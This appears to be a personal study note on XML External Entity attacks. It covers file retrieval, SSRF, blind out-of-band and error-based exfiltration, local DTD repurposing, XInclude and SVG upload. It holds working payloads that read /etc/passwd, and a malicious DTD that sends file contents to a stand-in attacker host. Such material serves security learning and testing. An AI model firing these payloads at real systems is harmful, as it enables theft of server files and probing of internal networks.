#XXE #Completed

![[XXE Thumbnail.jpeg]]
# XML External Entities

XXE allows you to interfere with an app's processing of XML data, allowing attackers to view files on the app server filesystem and interact with the backend or external systems. Some apps use XML to transmit data between browser and server.

Apps usually use a standard library or platform API to process XML data. XML external entities are custom XML entities whose defined values are loaded from outside of the DTD where they are declared.

Various attacks happen including:

- Exploiting XXE to retrieve files
- Exploiting XXE to perform SSRF
- Exploiting blind XXE to exfiltrate data out-of-band
- Exploiting blind XXE to retrieve data via errors
# Recon

Manually testing for XXE generally involves:

- Testing for file retrieval by defining an external entity based on a well known OS file and using that entity in data that is returned in the app's response.
- Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system.
- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well known OS file.
- If the app allows uploading files with a SVG, XML, XLSX extension or other file formats that use or contain XML subcomponents, try injecting an XXE payload.
- Modifying the content type of the requests to XML type and see if the app still processes the modified data correctly. If so, injecting an XXE payload.
# XXE to Retrieve Files

To retrieve files, modify the submitted XML in two potential ways:

- Edit a DOCTYPE element that defines an external entity containing the path to the file.
- Edit a data value in the XML that is returned in the app's response to make use of the defined external entity.

For example, a stock checker may submit some XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

If there's no defenses, you can exploit it to retrieve the `passwd` file by submitting:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

It defines an external entity `&xxe;` whose value is the contents of the `passwd` file and uses the entity within the productId value, causing the app's response to include the contents of the file.

>[!info]
>There are typically a large number of data values within submitted XML in real apps. Try testing each data node in the XML individually to see whether it appears within the response.
# XXE to Perform SSRF

XXE can also be used to perform SSRF where the server-side app can be induced to make HTTP requests to any URL the server can access.

To exploit, define an external XML entity using the URL to target, and use the defined entity within a data value. If you can use it within a data value returned in a response, you can view the response from the URL within the app's response.

If not, it will be a blind SSRF attack. For example, the following XXE will make a back end HTTP request to an internal system:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

If a response comes back with something like the following:

```bash
Invalid product ID: latest
```

Try adding `latest` to the end of the URL and re-submit to slowly find the full path.
# Blind XXE

Blind XXE occurs where the app is vulnerable, but no values are returned. There are two ways to find and exploit blind XXE:

1. Triggering out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
2. Triggering XML parser errors in a way that errors contain sensitive data.
# Detecting Blind XXE using OAST Techniques

Try detecting blind XXE using the same techniques, but trigger an out-of-band network interaction to a system you control. As an example:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

It may cause the server to make a back-end HTTP request to the specified URL. Try using a Collaborator payload and monitor for and DNS and HTTP requests to the domain. If present, it means the XXE attack was successful.
# Blind XXE via XML Parameter Entities

Sometimes regular entities rare blocked by input validation or XML parser hardening. If so, try using XML parameter entities instead. Parameter entities can only be referenced elsewhere within the DTD. The declaration of an XML parameter entity includes the `%` character before the entity name:

```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```

Parameter entities are referenced using the `%` character such as:

```xml
%myparameterentity;
```

To test for blind XXE using parameter entities, try the following:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

It declares an XML parameter entity and then uses the entity within the DTD, potentially causing a DNS and HTTP request to the collaborator domain.
# Blind XXE to Exfiltrate Data via External DTD

To exfiltrate data via blind XXE, you must host a malicious DTD on a system and invoke the external DTD from within the in-band XXE payload. An example may be:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfil;
```

It does as follows:

- Defines XML parameter entity containing the contents of `passwd`
- Defines an XML parameter entity containing a dynamic declaration of another XML parameter entity.
- The `exfiltrate` entity is evaluated by making an HTTP to the URL containing the value of the `file` entity within the query string.
- Uses the `eval` entity to cause the dynamic declaration of the `exfiltrate` entity to be performed.
- Uses the `exfiltrate` entity so its value is evaluated by requesting the specified URL.

To exploit, host the malicious DTD such as:

```http
http://web-attacker.com/malicious.dtd
```

And submit the following XXE payload to the vulnerable app:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

It declares an XML parameter entity and uses the entity within the DTD, causing the XML parser to fetch the external DTD and interpret it inline. The steps in the malicious DTD are executed and `passwd` is transmitted to the attacker.

>[!info]
>It may not work with some files with newlines as XML parsers fetch the URL using an API that validates the characters allowed to appear within the URL. If so, try using the FTP protocol instead. If still no success, other files may be needed.
# Blind XXE to Exfiltrate Data via Errors

An alternative is to trigger an XML parsing error that contains sensitive data which is useful if the app returns the resulting error message within its response. To trigger an XML parsing error containing `/etc/passwd`, try the following for an external DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

- It defines an XML parameter entity containing the contents of `passwd`
- It defines an XML parameter entity containing dynamic declaration of another XML parameter entity which is evaluated by loading a nonexistent file with the name containing the value of the `file` entity.
- Uses the `eval` entity to cause dynamic declaration of the `error` entity to be performed.
- Uses the `error` entity so the value is evaluated by attempting to load the nonexistent file, resulting in an error containing the name of the nonexistent file which is the contents.

After invoking it, it may produce an error such as:

```json
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

To invoke it, use an XXE payload such as:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```
# Blind XXE via Repurposed Local DTD

Previous payloads won't work with an internal DTD fully specified in the DOCTYPE element as it involves using an XML parameter entity within the definition of another parameter entity which is not permitted in internal DTDs.

If so, try to trigger error messages containing sensitive data. If a document's DTD uses a hybrid of internal and external DTD declarations, the internal DTD can redefine entities declared in the external DTD meaning an attacker can employ error-based XXE, provided the XML parameter entity used is redefining an entity declared within an external DTD.

If OAST connections are blocked, then the external DTD cannot be loaded from a remote location but must be an external DTD file that happens to exist on the local file system and repurpose it to redefine an existing entity that triggers a parsing error.

If there's a DTD such as `/usr/local/app/schema.dtd` and it defines an entity of `custom`, try triggering an XML parsing error by submitting a hybrid DTD such as:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

- Defines XML parameter entity `local_dtd` containing contents of external DTD file that exists.
- Redefines the XML parameter entity `custom` which is already defined in the external DTD file. Entity is redefined as containing an error based exploit.
- Uses the `local_dtd` entity so the external DTD is interpreted, including the redefined value of the `custom` entity.

If the app returns error messages thrown by the XML parser, you can enumerate local DTD files by attempting to load them from within the internal DTD. For example, Linux has a DTD file at `/usr/share/yelp/dtd/docbookx.dtd`. To test if the file is present:

```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

After testing common DTD files, you must obtain a copy of the file and review it to find an entity to redefine. Many common systems that include DTD files are open source, meaning you can find them quickly.
# XInclude

Some apps receive client-submitted data, embed it server-side into an XML document, and parse the document. For example, when client-submitted data is placed into a back-end SOAP request and processed by the backend SOAP service.

XInclude is part of the XML specification that allows an XML document to be built from sub-documents. Try placing an XInclude attack within any data value in an XML document, so the attack can work in situations where you only control a single item of data.

To perform XInclude attacks, reference the XInclude namespace and provide the path to the file to include such as:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

For example, try submitting a payload and observe the response such as:

```xml
%26entity;
```

It may return stating that entities are not allowed indicating XML is in use. A back-end statement may look something like:

```xml
<?xml version="1.0"?>
<storeInfo>
	<productId>USER-INPUT</productId>
</storeInfo>
```

If so, attempt the payload above.

>[!info]
>If XML is not present in the request, still try fuzzing XML payloads like the one above or try converting the request to XML - it may accept it anyways.
# XXE via File Upload

If an app allows file uploads, some common formats use XML or contain XML subcomponents such as DOCX and image formats like SVG. An app may allow users to upload images and process/validate them after uploading. If the app expects PNG or JPEG image, it may still support SVG images.

If so, try submitting a malicious SVG image such as the following:

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```

For example, attempt to upload a standard SVG image and observe if it accepts or not via POST request analysis. If it does, observe the request carefully.

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" version="1.1"
baseProfile="full" > <rect x="0" y="0" width="60" height="60" style="stroke: blue;"/>
<rect id="myRect" x="25" y="25" rx="0.6" ry="0.6" width="150" height="150" fill="blue"
stroke="black" stroke-width="8"/>
</svg>
```

Attempt to change the SVG content in the POST request to various XXE payloads such as:

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

Or the following:

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><img xlink:href="file:///etc/passwd"></image></svg>
```

If in-band is not an option, use an OOB payload such as:

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://COLLABORATOR-DOMAIN.COM" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
# XXE via Modified Content Type

Many POST requests use default content type such as `application/x-www-form-urlencoded`. Some sites expect requests in this format, but tolerate other content types. If a normal request contains the following:

```html
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

Try changing the content type to XML such as:

```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

If XML is tolerated and it is parsed, there may be XXE by reformatting requests to use XML formats.

